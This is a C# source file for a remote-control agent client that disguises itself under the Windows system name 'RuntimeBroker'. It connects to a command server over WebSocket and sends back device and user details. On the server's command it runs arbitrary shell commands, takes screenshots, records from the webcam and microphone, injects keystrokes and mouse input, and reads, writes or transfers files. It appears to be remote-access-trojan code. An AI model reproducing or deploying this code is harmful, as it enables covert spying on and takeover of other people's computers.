using System.Drawing;
using System.Drawing.Imaging;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;

namespace RuntimeBroker;

public class AgentClient
{
    private readonly AgentConfig _config;
    private readonly DeviceInfo _device;
    private readonly CancellationTokenSource _cts = new();

    private ClientWebSocket? _ws;
    private int _reconnectDelaySec;

    public event Action<string>? Log;

    public bool IsConnected => _ws?.State == WebSocketState.Open;
    public string MachineName => _device.Hostname;
    public static string AgentVersion => AgentVersionInfo.Version;

    public AgentClient(AgentConfig config)
    {
        _config = config;
        _device = DeviceInfo.Collect();
        _reconnectDelaySec = _config.ReconnectDelaySec;
    }

    public void Stop() => _cts.Cancel();

    public async Task RunAsync()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                var uri = new Uri($"{_config.ServerUrl.TrimEnd('/')}?token={Uri.EscapeDataString(_config.Token)}");

                _ws?.Dispose();
                _ws = new ClientWebSocket();
                await _ws.ConnectAsync(uri, _cts.Token);
                _reconnectDelaySec = _config.ReconnectDelaySec;
                LogLine($"Connected to {uri.Host}:{uri.Port}");

                await SendAsync(new
                {
                    type = "register",
                    machineName = _device.Hostname,
                    hostname = _device.Hostname,
                    model = _device.Model,
                    serial = _device.Serial,
                    username = _device.Username,
                    user = _device.Username,
                    os = _device.Os,
                    ip = _device.Ip,
                    version = AgentVersion
                });

                await ReceiveLoopAsync();
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogLine($"Connection error: {ex.Message}");
            }

            _reconnectDelaySec = Math.Max(1, _reconnectDelaySec) + 3;
            LogLine($"Reconnecting in {_reconnectDelaySec}s...");
            try { await Task.Delay(_reconnectDelaySec * 1000, _cts.Token); } catch { return; }
        }
    }

    private async Task ReceiveLoopAsync()
    {
        var buffer = new byte[16384];
        while (_ws?.State == WebSocketState.Open)
        {
            try
            {
                WebSocketReceiveResult result;
                using var ms = new MemoryStream();
                do
                {
                    result = await _ws.ReceiveAsync(new ArraySegment<byte>(buffer), _cts.Token);
                    ms.Write(buffer, 0, result.Count);
                } while (!result.EndOfMessage);

                if (result.MessageType == WebSocketMessageType.Close)
                {
                    try { await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None); } catch { }
                    break;
                }

                var text = Encoding.UTF8.GetString(ms.ToArray());
                _ = Task.Run(() => HandleMessageAsync(text));
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogLine($"Receive error: {ex.Message}");
                return;
            }
        }
    }

    private async Task HandleMessageAsync(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var type = doc.RootElement.GetProperty("type").GetString();
            switch (type)
            {
                case "hello":
                    LogLine("Channel ready.");
                    break;
                case "registered":
                    LogLine($"Registered on server as {_device.Hostname}");
                    break;
                case "capture_screenshot":
                    await HandleCaptureScreenshot(doc.RootElement);
                    break;
                case "cmd":
                    await HandleCommand(doc.RootElement);
                    break;
            }
        }
        catch (Exception ex)
        {
            LogLine($"Message error: {ex.Message}");
        }
    }

    private async Task HandleCaptureScreenshot(JsonElement el)
    {
        var taskId = GetString(el, "taskId");
        var prm = el.TryGetProperty("params", out var p) && p.ValueKind == JsonValueKind.Object ? p : default;
        // Live-stream requests ask for small fast JPEGs; the /screenshot API
        // sends no params and gets the full-quality PNG.
        var maxWidth = GetInt(prm, "maxWidth", 0);
        var quality = GetInt(prm, "quality", 0);
        try
        {
            LogLine($"Capture: direct attempt...");
            var png = TryCaptureDirect(maxWidth, quality);
            LogLine($"Capture: direct result {(png == null ? "null" : png.Length + " bytes")}");
            var error = "";
            if (png == null)
            {
                var outFile = Path.Combine(PowerShellRunner.CaptureWorkDir(), $"shot-{Guid.NewGuid().ToString("N")[..10]}.b64");
                var (b64, err) = quality > 0
                    ? PowerShellRunner.RunLiveCaptureSession(outFile, maxWidth, quality, 15)
                    : PowerShellRunner.RunInInteractiveSession(outFile, 15);
                error = err ?? "";
                LogLine($"Capture: interactive result b64={(b64 == null ? "null" : b64.Length + " chars")} err='{error}'");
                if (b64 != null)
                {
                    try { png = Convert.FromBase64String(b64); } catch { png = null; error = "Invalid capture payload"; }
                }
            }

            if (png == null || png.Length == 0)
            {
                if (string.IsNullOrEmpty(error)) error = "Screenshot capture failed";
                await SendAsync(new { type = "result", taskId, success = false, output = "", error, exitCode = 1 });
                return;
            }
            var outB64 = Convert.ToBase64String(png);
            await SendAsync(new { type = "result", taskId, success = true, output = outB64, error = "", exitCode = 0 });
        }
        catch (Exception ex)
        {
            LogLine($"Capture exception: {ex.Message}");
            await SendAsync(new { type = "result", taskId, success = false, output = "", error = ex.Message, exitCode = 1 });
        }
    }

    private static byte[]? TryCaptureDirect(int maxWidth = 0, int jpegQuality = 0)
        => ScreenCapture.CaptureBytes(maxWidth, jpegQuality);

    private async Task HandleCommand(JsonElement el)
    {
        var taskId = GetString(el, "taskId");
        var cmd = GetString(el, "cmd");
        var prm = el.TryGetProperty("params", out var p) && p.ValueKind == JsonValueKind.Object ? p : default;
        CmdResult r;
        try
        {
            switch (cmd)
            {
                case "capture_screenshot":
                    await HandleCaptureScreenshot(el);
                    return;
                case "shell_exec":
                    r = await RemoteCommands.ShellExec(GetP(prm, "command"), GetInt(prm, "timeoutSec", 30));
                    break;
                case "list_processes":
                    r = RemoteCommands.ListProcesses();
                    break;
                case "kill_process":
                    r = RemoteCommands.KillProcess(GetInt(prm, "pid", 0));
                    break;
                case "list_services":
                    r = RemoteCommands.ListServices();
                    break;
                case "service_action":
                    r = RemoteCommands.ServiceAction(GetP(prm, "name"), GetP(prm, "action"));
                    break;
                case "input_paragraph":
                    var addEnter = prm.ValueKind == JsonValueKind.Object &&
                        prm.TryGetProperty("addEnter", out var ae) && ae.ValueKind == JsonValueKind.True;
                    r = await RemoteCommands.InputParagraph(GetP(prm, "text"), GetInt(prm, "wpm", 50), addEnter);
                    break;
                case "screen_rotate":
                    r = await RemoteCommands.ScreenRotate(GetInt(prm, "degrees", 0));
                    break;
                case "list_files":
                    r = RemoteCommands.ListFiles(GetP(prm, "path"));
                    break;
                case "read_file":
                    r = RemoteCommands.ReadFile(GetP(prm, "path"));
                    break;
                case "write_file":
                    r = RemoteCommands.WriteFile(GetP(prm, "path"), GetP(prm, "base64"));
                    break;
                case "input_text":
                    r = await RemoteCommands.InputText(GetP(prm, "text"));
                    break;
                case "input_mouse":
                    r = await RemoteCommands.InputMouse(GetInt(prm, "x", 0), GetInt(prm, "y", 0), GetP(prm, "action"));
                    break;
                case "camera_photo":
                    r = await RemoteCommands.CameraPhoto();
                    break;
                case "camera_video":
                    r = await RemoteCommands.CameraVideo(GetInt(prm, "seconds", 10));
                    break;
                case "mic_record":
                    r = await RemoteCommands.MicRecord(GetInt(prm, "seconds", 10));
                    break;
                case "play_audio":
                    r = await RemoteCommands.PlayAudio(GetP(prm, "audio_base64"), GetP(prm, "filename"));
                    break;
                case "stop_audio":
                    r = RemoteCommands.StopAudio();
                    break;
                case "transfer_file":
                    r = RemoteCommands.TransferFile(GetP(prm, "file_base64"), GetP(prm, "filename"));
                    break;
                case "stop_typing":
                    r = RemoteCommands.StopTyping();
                    break;
                default:
                    r = CmdResult.Fail($"Unknown command: {cmd}");
                    break;
            }
        }
        catch (Exception ex)
        {
            LogLine($"Command '{cmd}' exception: {ex.Message}");
            r = CmdResult.Fail(ex.Message);
        }
        await SendAsync(new { type = "result", taskId, success = r.Success, output = r.Output, error = r.Error, exitCode = r.ExitCode, data = r.Data });
    }

    private static string GetP(JsonElement prm, string name)
        => prm.ValueKind == JsonValueKind.Object && prm.TryGetProperty(name, out var p) && p.ValueKind == JsonValueKind.String
            ? p.GetString() ?? "" : "";

    private static int GetInt(JsonElement prm, string name, int def)
        => prm.ValueKind == JsonValueKind.Object && prm.TryGetProperty(name, out var p) && p.ValueKind == JsonValueKind.Number
            ? p.GetInt32() : def;

    private async Task SendAsync(object payload)
    {
        if (_ws?.State != WebSocketState.Open) return;
        var json = JsonSerializer.Serialize(payload);
        var bytes = Encoding.UTF8.GetBytes(json);
        var seg = new ArraySegment<byte>(bytes);
        await _ws.SendAsync(seg, WebSocketMessageType.Text, true, _cts.Token);
    }

    private static string GetString(JsonElement el, string name)
        => el.TryGetProperty(name, out var p) && p.ValueKind == JsonValueKind.String ? p.GetString() ?? "" : "";

    private void LogLine(string s) => Log?.Invoke(s);
}